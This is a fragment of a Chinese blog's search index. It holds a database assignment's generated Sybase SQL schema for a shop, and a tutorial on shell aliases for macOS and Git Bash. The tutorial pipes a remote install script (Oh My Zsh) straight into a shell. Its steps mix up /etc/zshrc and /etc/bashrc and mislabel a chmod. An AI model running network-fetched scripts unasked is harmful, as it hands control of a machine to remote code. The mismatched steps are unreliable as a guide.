src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%B7%A5%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1/20230828211231407880_506_20220919004327928426_899_image-20220415222820109.png" alt="image-20220415222820109"><figcaption aria-hidden="true">image-20220415222820109</figcaption></figure><h4 id="生成sql语句">3.3 生成SQL语句</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cjh0xllmrh9u69"></i><span>sql</span><div class="collapse show" id="collapse-cjh0xllmrh9u69"><pre><code class="hljs sql"><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* DBMS name:      Sybase SQL Anywhere 12                       */</span><span class="hljs-comment">/* Created on:     2022/4/15 22:28:49                           */</span><span class="hljs-comment">/*==============================================================*/</span>if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_BUY_BUY_CUSTOMER'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_BUY_BUY_CUSTOMER<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_BUY_BUY2_GOODS'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_BUY_BUY2_GOODS<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_GOODS_ON_SHELF'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> goods       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_GOODS_ON_SHELF<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SELL_SELL_EMPLOYEE'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SELL_SELL_EMPLOYEE<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SELL_SELL2_GOODS'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SELL_SELL2_GOODS<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SUPPLY_SUPPLY_GOODS'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SUPPLY_SUPPLY_GOODS<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SUPPLY_SUPPLY2_SUPPLIER'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SUPPLY_SUPPLY2_SUPPLIER<span class="hljs-keyword">end</span> if;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> buy.buy2_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> buy.buy_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> buy.buy_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> buy;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> customer.customer_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> customer;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> employee.emplyer_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> employee;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> goods.on_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> goods.goods_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> goods;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> sell.sell2_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> sell.sell_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> sell.sell_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> sell;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> shelf.shelf_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> shelf;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supplier.supplier_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> supplier;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supply.supply2_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supply.supply_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supply.supply_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> supply;<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: buy                                                   */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> buy (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   buy_time             <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   buy_costs            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_BUY <span class="hljs-keyword">primary</span> key clustered (cu_id, goods_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: buy_PK                                                */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> clustered index buy_PK <span class="hljs-keyword">on</span> buy (cu_id <span class="hljs-keyword">ASC</span>,goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: buy_FK                                                */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index buy_FK <span class="hljs-keyword">on</span> buy (cu_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: buy2_FK                                               */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index buy2_FK <span class="hljs-keyword">on</span> buy (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: customer                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> customer (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   cu_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_CUSTOMER <span class="hljs-keyword">primary</span> key (cu_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: customer_PK                                           */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index customer_PK <span class="hljs-keyword">on</span> customer (cu_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: employee                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee (   emp_name             <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   salary               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_EMPLOYEE <span class="hljs-keyword">primary</span> key (emp_no));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: emplyer_PK                                            */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index emplyer_PK <span class="hljs-keyword">on</span> employee (emp_no <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: goods                                                 */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> goods (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_name           <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   price                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shell_life           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_GOODS <span class="hljs-keyword">primary</span> key (goods_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: goods_PK                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index goods_PK <span class="hljs-keyword">on</span> goods (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: on_FK                                                 */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index on_FK <span class="hljs-keyword">on</span> goods (shelf_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: sell                                                  */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sell (   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SELL <span class="hljs-keyword">primary</span> key clustered (emp_no, goods_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: sell_PK                                               */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> clustered index sell_PK <span class="hljs-keyword">on</span> sell (emp_no <span class="hljs-keyword">ASC</span>,goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: sell_FK                                               */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index sell_FK <span class="hljs-keyword">on</span> sell (emp_no <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: sell2_FK                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index sell2_FK <span class="hljs-keyword">on</span> sell (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: shelf                                                 */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> shelf (   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num_on_shelf   <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SHELF <span class="hljs-keyword">primary</span> key (shelf_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: shelf_PK                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index shelf_PK <span class="hljs-keyword">on</span> shelf (shelf_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: supplier                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supplier (   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   address              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   phone                <span class="hljs-type">char</span>(<span class="hljs-number">11</span>)                       <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLIER <span class="hljs-keyword">primary</span> key (sp_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supplier_PK                                           */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index supplier_PK <span class="hljs-keyword">on</span> supplier (sp_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: supply                                                */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supply (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   enter_time           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   costs                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLY <span class="hljs-keyword">primary</span> key clustered (goods_id, sp_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supply_PK                                             */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> clustered index supply_PK <span class="hljs-keyword">on</span> supply (goods_id <span class="hljs-keyword">ASC</span>,sp_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supply_FK                                             */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index supply_FK <span class="hljs-keyword">on</span> supply (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supply2_FK                                            */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index supply2_FK <span class="hljs-keyword">on</span> supply (sp_id <span class="hljs-keyword">ASC</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_BUY_BUY_CUSTOMER <span class="hljs-keyword">foreign</span> key (cu_id)      <span class="hljs-keyword">references</span> customer (cu_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_BUY_BUY2_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> goods   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_GOODS_ON_SHELF <span class="hljs-keyword">foreign</span> key (shelf_id)      <span class="hljs-keyword">references</span> shelf (shelf_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL_EMPLOYEE <span class="hljs-keyword">foreign</span> key (emp_no)      <span class="hljs-keyword">references</span> employee (emp_no)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL2_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SUPPLY_SUPPLY_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SUPPLY_SUPPLY2_SUPPLIER <span class="hljs-keyword">foreign</span> key (sp_id)      <span class="hljs-keyword">references</span> supplier (sp_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;</code></pre></div></div><h4 id="分析差异">4.1 分析差异</h4><p>有差异。PowerDesigner会事先判断外键约束、索引以及表本身是否存在，若存在会删除。同时也会对表建立索引。但是基本逻辑是一致的，在总体的设计上不会造成影响。</p><h4 id="语句特点">4.2 语句特点</h4><p>从4.1的分析可以看出，PowerDesigner生成的语句更严谨。当然，语句顺序比如外键约束声明的位置也有不同。这些附加语句的作用是防止特殊情况的发生导致无法正常建立表。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>macOS配置命令别名</title>
    <link href="/posts/42356/"/>
    <url>/posts/42356/</url>
    
    <content type="html"><![CDATA[<h2 id="macos配置命令别名">macOS配置命令别名</h2><h3 id="临时别名">临时别名</h3><p>和在linux系统一样，直接输入<code>alias</code>命令即可。在当前的终端下生效。</p><p>比如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-moa89klmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-moa89klmrh9u65"><pre><code class="hljs shell">alias v="vim"</code></pre></div></div><h3 id="永久别名">永久别名</h3><p><strong>写在前面：知其然也要知其所以然，下面的命令不要急着拷贝运行一把梭！</strong></p><p>由于现在的macOS默认是采用的<code>zsh</code>而不是<code>bash</code>，因此配置文件路径为</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-50t3bllmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-50t3bllmrh9u65"><pre><code class="hljs shell">sudo vim /etc/zshrc</code></pre></div></div><p>当然也可以</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2gzfl3lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-2gzfl3lmrh9u65"><pre><code class="hljs shell">chsh -s /bin/bash</code></pre></div></div><p>进入<code>bash</code>，不过目前没什么理由这么干(</p><p>然后会发现这个文件是只读的。</p><p>有两个解决方案。</p><h4 id="简单粗暴的">简单粗暴的</h4><p>去除写权限</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kyfz4elmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-kyfz4elmrh9u65"><pre><code class="hljs shell">sudo chmod u+w /etc/bashrc</code></pre></div></div><p>然后写入别名，保存</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-obi0dilmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-obi0dilmrh9u65"><pre><code class="hljs shell">source /etc/bashrc</code></pre></div></div><p>最后将写权限去除</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uc7xbclmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-uc7xbclmrh9u65"><pre><code class="hljs shell">sudo chmod u-w /etc/bashrc</code></pre></div></div><h4 id="安装插件">安装插件</h4><p><a href="https://github.com/ohmyzsh/ohmyzsh"><strong>Oh MyZsh</strong></a>是一款社区驱动的命令行工具，可以配置主题，插件等。</p><p>用curl方式安装</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wrplqclmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-wrplqclmrh9u65"><pre><code class="hljs shell">sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"</code></pre></div></div><p>在<code>.zshrc</code>中配置<code>alias</code>，<code>source</code>保存即可，里面还可以配置其他实用的配置。<a href="https://mrseawave.github.io/blogs/articles/2021/08/29/oh-my-zsh/">这个博客</a>有较详细叙述。</p><p>所以，安装插件后可以(不安装插件也可以在用户根目录新建这个文件)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y23f6elmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-y23f6elmrh9u65"><pre><code class="hljs shell">vim ~/.zshrc</code></pre></div></div><p>然后添加自己想添加的别名，如<code>alias v="vim"</code></p><p>最后</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lhbx3plmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-lhbx3plmrh9u65"><pre><code class="hljs shell">source ~/.zshrc</code></pre></div></div><h2 id="windows的git-bash设置永久别名">windows的gitbash设置永久别名</h2><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5cm5t8lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-5cm5t8lmrh9u65"><pre><code class="hljs shell">vim /etc/profile.d/aliases.sh # 编辑aliases文件</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/macOS%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4%E5%88%AB%E5%90%8D/20230828210441159140_423_20230128114558552930_510_image-20230128114429306.png" alt="image-20230128114429306"><figcaption aria-hidden="true">image-20230128114429306</figcaption></figure><p>文件中已经给出了一些实例，按需添加即可，比如可以将常用的脚本添加进来。</p><p>之后重启终端即可。</p>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
